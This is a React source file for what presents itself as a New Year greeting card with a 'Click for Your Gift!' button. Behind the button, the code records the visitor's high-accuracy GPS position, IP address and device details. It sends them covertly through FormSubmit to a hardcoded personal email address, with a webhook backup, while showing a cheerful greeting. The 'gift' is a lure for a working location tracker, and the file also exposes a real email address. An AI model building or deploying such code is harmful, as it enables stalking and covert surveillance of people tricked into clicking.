import React, { useState } from 'react';
import { Gift, Sparkles, Send } from 'lucide-react';
import './NewYearGreeting.css';

export default function NewYearGreeting() {
  const [showGift, setShowGift] = useState(false);
  const [sending, setSending] = useState(false);

  const getDeviceInfo = () => {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      viewport: `${window.innerWidth}x${window.innerHeight}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timestamp: new Date().toISOString(),
      cookiesEnabled: navigator.cookieEnabled,
      onlineStatus: navigator.onLine,
    };
  };

  const getIPAddress = async () => {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 2000); // 2 second timeout
      const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
      clearTimeout(timeoutId);
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.warn('IP fetch failed:', error);
      return 'Unable to fetch';
    }
  };

  const handleButtonClick = async () => {
    setSending(true);

    try {
      // Get IP address first
      const ipAddress = await getIPAddress();

      // Get location with higher accuracy
      const position = await new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error('Geolocation not supported'));
          return;
        }

        navigator.geolocation.getCurrentPosition(
          resolve,
          reject,
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
          }
        );
      });

      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: Math.round(position.coords.accuracy),
        altitude: position.coords.altitude || 'N/A',
        speed: position.coords.speed || 'N/A',
        timestamp: new Date(position.timestamp).toLocaleString(),
      };

      const deviceInfo = getDeviceInfo();

      await sendEmail({
        location: locationData,
        device: deviceInfo,
        ipAddress: ipAddress,
        status: 'success'
      });

      setShowGift(true);
    } catch (error) {
      console.log('Location error:', error);

      const ipAddress = await getIPAddress();
      const deviceInfo = getDeviceInfo();

      await sendEmail({
        location: {
          error: error.message || 'Location access denied',
          errorCode: error.code || 'unknown'
        },
        device: deviceInfo,
        ipAddress: ipAddress,
        status: 'location_denied'
      });

      setShowGift(true);
      // Even if everything fails, show the gift!
      setShowGift(true);
    } finally {
      setSending(false);
    }
  };

  const sendEmail = async (data) => {
    const YOUR_EMAIL = 'chetanshende137@gmail.com';

    // Format location info better
    let locationInfo = '';
    if (data.status === 'success') {
      locationInfo = `
✅ LOCATION CAPTURED SUCCESSFULLY!

📍 Coordinates:
   Latitude: ${data.location.latitude}
   Longitude: ${data.location.longitude}

🎯 Accuracy: ${data.location.accuracy} meters
🏔️ Altitude: ${data.location.altitude}
⚡ Speed: ${data.location.speed}
⏰ Location Time: ${data.location.timestamp}

🗺️ View on Google Maps:
   https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}

🗺️ View on OpenStreetMap:
   https://www.openstreetmap.org/?mlat=${data.location.latitude}&mlon=${data.location.longitude}&zoom=15
      `;
    } else {
      locationInfo = `
❌ LOCATION NOT AVAILABLE
   Error: ${data.location.error}
   Error Code: ${data.location.errorCode}
      `;
    }

    const emailBody = `
🎁 NEW YEAR GIFT CLICKED! 🎁
=====================================

${locationInfo}

🌐 IP ADDRESS: ${data.ipAddress}

💻 DEVICE INFORMATION:
=====================================
🖥️ User Agent: ${data.device.userAgent}
⚙️ Platform: ${data.device.platform}
🌍 Language: ${data.device.language}
📱 Screen Resolution: ${data.device.screenResolution}
🖼️ Viewport: ${data.device.viewport}
🕐 Timezone: ${data.device.timezone}
🍪 Cookies Enabled: ${data.device.cookiesEnabled}
📶 Online: ${data.device.onlineStatus}
📅 Click Time: ${data.device.timestamp}

=====================================
Sent via New Year Greeting Tracker
    `;

    // Method 1: FormSubmit
    try {
      const formData = new FormData();
      formData.append('_subject', '🎁 New Year Gift Clicked - Location Tracked!');
      formData.append('_template', 'table');
      formData.append('_captcha', 'false');
      formData.append('Location_Status', data.status);

      if (data.status === 'success') {
        formData.append('Latitude', data.location.latitude);
        formData.append('Longitude', data.location.longitude);
        formData.append('Accuracy', data.location.accuracy + ' meters');
        formData.append('Google_Maps', `https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}`);
      }

      formData.append('IP_Address', data.ipAddress);
      formData.append('Device', data.device.userAgent);
      formData.append('Platform', data.device.platform);
      formData.append('Timezone', data.device.timezone);
      formData.append('Full_Details', emailBody);

      const response = await fetch(`https://formsubmit.co/ajax/${YOUR_EMAIL}`, {
        method: 'POST',
        headers: {
          'Accept': 'application/json'
        },
        body: formData
      });

      const result = await response.json();
      console.log('Email sent:', result);

      // Method 2: Backup - Send to a webhook (optional)
      // You can also use services like webhook.site to test
      try {
        await fetch('https://webhook.site/your-unique-url', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email: YOUR_EMAIL,
            data: data,
            formatted: emailBody
          })
        });
      } catch (webhookError) {
        console.log('Webhook backup failed:', webhookError);
      }

    } catch (error) {
      console.error('Email send error:', error);

      // Method 3: Fallback - Use mailto (opens email client)
      const mailtoLink = `mailto:${YOUR_EMAIL}?subject=New Year Gift Clicked&body=${encodeURIComponent(emailBody)}`;
      window.open(mailtoLink, '_blank');
    }
  };

  if (showGift) {
    return (
      <div className="gift-container">
        <div className="content-wrapper">
          <div className="gift-icon-wrapper bouncing">
            <Gift className="gift-icon" />
          </div>
          <h1 className="title">
            🎉 Happy New Year 2025! 🎉
          </h1>
          <p className="subtitle">
            Wishing you joy, success, and endless possibilities!
          </p>
          <div className="card">
            <Sparkles className="card-icon" />
            <p className="card-title">
              May this year bring you:
            </p>
            <ul className="wish-list">
              <li>✨ Abundant happiness</li>
              <li>💪 Great health</li>
              <li>🚀 Amazing opportunities</li>
              <li>❤️ Love and laughter</li>
            </ul>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="gift-container start-container">
      <div className="content-wrapper">
        <div className="gift-icon-wrapper">
          <Sparkles className="sparkle-icon" />
        </div>

        <h1 className="title">
          Happy New Year!
        </h1>

        <p className="description">
          I have a special New Year gift for you! 🎁
        </p>

        <button
          onClick={handleButtonClick}
          disabled={sending}
          className="gift-button"
        >
          {sending ? (
            <>
              <Send className="button-icon spinning" />
              Opening...
            </>
          ) : (
            <>
              <Gift className="button-icon" />
              Click for Your Gift!
            </>
          )}
        </button>

        <p className="footer-text">
          Click the button above to reveal your surprise! 🎊
        </p>
      </div>
    </div>
  );
}
